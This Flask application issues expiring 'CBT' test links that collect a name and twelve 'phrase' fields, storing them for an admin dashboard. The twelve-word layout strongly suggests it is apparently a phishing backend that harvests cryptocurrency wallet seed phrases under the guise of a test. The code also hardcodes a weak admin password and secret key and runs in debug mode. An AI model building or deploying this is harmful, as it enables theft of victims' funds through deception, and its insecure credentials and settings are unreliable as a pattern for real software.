from flask import Flask, render_template, request, redirect, url_for, session
import sqlite3
import uuid
from datetime import datetime, timedelta

app = Flask(__name__)
app.secret_key = "opueh334"

DATABASE = "database.db"

ADMIN_USERNAME = "adminopueh"
ADMIN_PASSWORD = "1243"

# ------------------ DATABASE ------------------ #

def init_db():
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()

    c.execute("CREATE TABLE IF NOT EXISTS submissions ("
              "id INTEGER PRIMARY KEY AUTOINCREMENT,"
              "name TEXT,"
              "phrase1 TEXT, phrase2 TEXT, phrase3 TEXT, phrase4 TEXT,"
              "phrase5 TEXT, phrase6 TEXT, phrase7 TEXT, phrase8 TEXT,"
              "phrase9 TEXT, phrase10 TEXT, phrase11 TEXT, phrase12 TEXT)")

    c.execute("CREATE TABLE IF NOT EXISTS tokens ("
              "id INTEGER PRIMARY KEY AUTOINCREMENT,"
              "token TEXT,"
              "expiry TEXT)")

    conn.commit()
    conn.close()

init_db()

# ------------------ HOME ------------------ #

@app.route("/")
def home():
    return redirect(url_for("login"))

# ------------------ LOGIN ------------------ #

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]

        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session["admin"] = True
            return redirect(url_for("generate"))  # GO TO TEST GENERATOR
        else:
            return render_template("login.html", error="Invalid credentials")

    return render_template("login.html")

# ------------------ LOGOUT ------------------ #

@app.route("/logout")
def logout():
    session.pop("admin", None)
    return redirect(url_for("login"))

# ------------------ GENERATE TEST LINK ------------------ #

@app.route("/generate")
def generate():
    if "admin" not in session:
        return redirect(url_for("login"))

    token = str(uuid.uuid4())
    expiry = datetime.now() + timedelta(hours=1)

    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("INSERT INTO tokens (token, expiry) VALUES (?, ?)",
              (token, expiry.strftime("%Y-%m-%d %H:%M:%S")))
    conn.commit()
    conn.close()

    full_link = request.host_url + "cbt/" + token

    return f"""
    <h2>Test Link Generated ✅</h2>
    <p>Send this link:</p>
    <a href="{full_link}">{full_link}</a>
    <br><br>
    <a href="/logout">Logout</a>
    """

# ------------------ CBT PAGE ------------------ #

@app.route("/cbt/<token>", methods=["GET", "POST"])
def cbt(token):
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("SELECT expiry FROM tokens WHERE token=?", (token,))
    result = c.fetchone()
    conn.close()

    if not result:
        return render_template("expired.html")

    expiry_time = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")

    if datetime.now() > expiry_time:
        return render_template("expired.html")

    if request.method == "POST":
        name = request.form["name"]
        phrases = [request.form.get("phrase" + str(i)) for i in range(1, 13)]

        conn = sqlite3.connect(DATABASE)
        c = conn.cursor()
        c.execute("INSERT INTO submissions VALUES (NULL, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                  (name, *phrases))
        conn.commit()
        conn.close()

        return render_template("success.html")

    remaining = int((expiry_time - datetime.now()).total_seconds())
    return render_template("cbt.html", remaining=remaining)

# ------------------ ADMIN DASHBOARD ------------------ #

@app.route("/admin")
def admin():
    if "admin" not in session:
        return redirect(url_for("login"))

    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("SELECT * FROM submissions")
    data = c.fetchall()
    conn.close()

    return render_template("admin.html", data=data)

# ------------------ DELETE PHRASE ------------------ #

@app.route("/delete/<int:id>/<int:phrase_no>")
def delete_phrase(id, phrase_no):
    if "admin" not in session:
        return redirect(url_for("login"))

    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("UPDATE submissions SET phrase" + str(phrase_no) + "='' WHERE id=?", (id,))
    conn.commit()
    conn.close()

    return redirect(url_for("admin"))

# ------------------ RUN ------------------ #

if __name__ == "__main__":
    app.run(debug=True)
